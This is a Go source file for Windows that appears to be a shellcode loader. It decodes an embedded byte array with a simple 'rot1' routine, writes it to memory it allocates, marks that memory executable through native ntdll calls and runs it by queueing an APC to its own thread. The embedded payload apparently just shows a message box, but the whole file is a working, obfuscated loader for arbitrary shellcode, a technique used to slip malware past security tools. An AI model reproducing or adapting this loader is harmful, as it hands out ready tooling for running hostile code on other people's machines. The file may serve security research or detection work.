package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

//syscall declarations
var (
	ntdll                   = syscall.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	ntProtectVirtualMemory  = ntdll.NewProc("NtProtectVirtualMemory")
	ntQueueApcThread        = ntdll.NewProc("NtQueueApcThread")
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	openThread              = kernel32.NewProc("OpenThread")
	sleepEx                 = kernel32.NewProc("SleepEx")
	getCurrentThreadId      = kernel32.NewProc("GetCurrentThreadId")
)

const (
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
	STATUS_SUCCESS     = 0x0
	THREAD_SET_CONTEXT = 0x0010
)

func rot1Decrypt(input []byte) []byte {
	decrypted := make([]byte, len(input))
	for i, b := range input {
		decrypted[i] = b - 1
	}
	return decrypted
}

func main() {
	ecsc := []byte{0xFD, 0x49, 0x82, 0xE5, 0xF1, 0x0, 0x0, 0x0, 0xE9, 0xD1, 0x1, 0x1, 0x1, 0x42, 0x52, 0x42, 0x51, 0x53, 0x52, 0x57, 0x49, 0x32, 0xD3, 0x66, 0x49, 0x8C, 0x53, 0x61, 0x3F, 0x49, 0x8C, 0x53, 0x19, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x49, 0x8C, 0x73, 0x51, 0x3F, 0x49, 0x10, 0xB8, 0x4B, 0x4B, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x3D, 0x62, 0x7D, 0x3, 0x2D, 0x21, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0xE3, 0xEE, 0x53, 0x42, 0x52, 0x3F, 0x49, 0x8C, 0x53, 0x21, 0x3F, 0x8C, 0x43, 0x3D, 0x49, 0x2, 0xD1, 0x3F, 0x8C, 0x81, 0x89, 0x1, 0x1, 0x1, 0x49, 0x86, 0xC1, 0x75, 0x70, 0x49, 0x2, 0xD1, 0x51, 0x3F, 0x8C, 0x49, 0x19, 0x3F, 0x45, 0x8C, 0x41, 0x21, 0x4A, 0x2, 0xD1, 0xE4, 0x5D, 0x49, 0x0, 0xCA, 0x3F, 0x42, 0x8C, 0x35, 0x89, 0x49, 0x2, 0xD7, 0x4E, 0x32, 0xCA, 0x49, 0x32, 0xC1, 0xAD, 0x42, 0xC2, 0xCA, 0xE, 0x42, 0x2, 0xC2, 0x39, 0xE1, 0x76, 0xF2, 0x3F, 0x4D, 0x4, 0x4D, 0x25, 0x9, 0x46, 0x3A, 0xD2, 0x76, 0xD7, 0x59, 0x3F, 0x45, 0x8C, 0x41, 0x25, 0x4A, 0x2, 0xD1, 0x67, 0x3F, 0x42, 0x8C, 0xD, 0x49, 0x3F, 0x45, 0x8C, 0x41, 0x1D, 0x4A, 0x2, 0xD1, 0x3F, 0x42, 0x8C, 0x5, 0x89, 0x49, 0x2, 0xD1, 0x42, 0x59, 0x42, 0x59, 0x5F, 0x5A, 0x5B, 0x42, 0x59, 0x42, 0x5A, 0x42, 0x5B, 0x49, 0x84, 0xED, 0x21, 0x42, 0x53, 0x0, 0xE1, 0x59, 0x42, 0x5A, 0x5B, 0x3F, 0x49, 0x8C, 0x13, 0xEA, 0x4A, 0x0, 0x0, 0x0, 0x5E, 0x3F, 0x49, 0x8E, 0x8E, 0x28, 0x2, 0x1, 0x1, 0x42, 0xBB, 0x4D, 0x78, 0x27, 0x8, 0x0, 0xD6, 0x4A, 0xC8, 0xC2, 0x1, 0x1, 0x1, 0x1, 0x3F, 0x49, 0x8E, 0x96, 0xF, 0x2, 0x1, 0x1, 0x3F, 0x4D, 0x8E, 0x86, 0x1D, 0x2, 0x1, 0x1, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0x46, 0x84, 0x57, 0x8, 0x0, 0xD6, 0x49, 0x32, 0xCA, 0x42, 0xBB, 0xF1, 0xB6, 0xA3, 0x57, 0x0, 0xD6, 0x74, 0x69, 0x66, 0x6D, 0x6D, 0x64, 0x70, 0x65, 0x66, 0x21, 0x73, 0x76, 0x6F, 0x1, 0x4E, 0x66, 0x74, 0x74, 0x62, 0x68, 0x66, 0x43, 0x70, 0x79, 0x1, 0x76, 0x74, 0x66, 0x73, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x69, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x81, 0x42, 0x1, 0x1, 0x1, 0x31, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x8F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9F, 0x42, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4C, 0x46, 0x53, 0x4F, 0x46, 0x4D, 0x34, 0x33, 0x2F, 0x65, 0x6D, 0x6D, 0x1, 0x1, 0x59, 0x5, 0x57, 0x6A, 0x73, 0x75, 0x76, 0x62, 0x6D, 0x42, 0x6D, 0x6D, 0x70, 0x64, 0x1, 0x1, 0x6, 0x2, 0x46, 0x79, 0x6A, 0x75, 0x51, 0x73, 0x70, 0x64, 0x66, 0x74, 0x74, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x9, 0x1, 0x1, 0x1, }
	data := rot1Decrypt(ecsc)

	proc, _ := syscall.GetCurrentProcess()

	// Get the current thread ID and open the current thread with sufficient permissions
	threadID, _, _ := getCurrentThreadId.Call()
	thread, _, err := openThread.Call(THREAD_SET_CONTEXT, 0, threadID)
	if thread == 0 {
		panic(fmt.Sprintf("OpenThread failed: %v", err))
	}
	fmt.Printf("Opened thread with handle: 0x%x\n", thread)

	// Allocate memory
	var baseAddress uintptr
	size := uintptr(len(data))
	ntStatus, _, _ := ntAllocateVirtualMemory.Call(
		uintptr(proc),
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&size)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE, // Start with PAGE_READWRITE protec 
	)
	if ntStatus != STATUS_SUCCESS {
		panic(fmt.Sprintf("NtAllocateVirtualMemory failed with status: 0x%x", ntStatus))
	}
	fmt.Printf("Memory allocated at: 0x%x\n", baseAddress)

	// Copy shellcode in memory
	for i, b := range data {
		*(*byte)(unsafe.Pointer(baseAddress + uintptr(i))) = b
	}
	fmt.Println("Shellcode written to memory")

	// Change memory protection to PAGE_EXECUTE_READ to be able to execute the shellcode
	oldProtect := PAGE_READWRITE
	ntStatus, _, _ = ntProtectVirtualMemory.Call(
		uintptr(proc),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&size)),
		PAGE_EXECUTE_READ, 
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ntStatus != STATUS_SUCCESS {
		panic(fmt.Sprintf("NtProtectVirtualMemory failed with status: 0x%x", ntStatus))
	}
	fmt.Println("Memory protection changed to PAGE_EXECUTE_READ")

	// Queue an APC to the main thread of our process
	ntStatus, _, _ = ntQueueApcThread.Call(
		thread,
		baseAddress,
		0,
		0,
		0,
	)
	if ntStatus != STATUS_SUCCESS {
		panic(fmt.Sprintf("NtQueueApcThread failed with status: 0x%x", ntStatus))
	}
	fmt.Println("APC queued successfully")

	sleepEx.Call(0, 1) // SleepEx(0, TRUE) puts the thread in an alertable state, that trigger the APC
}
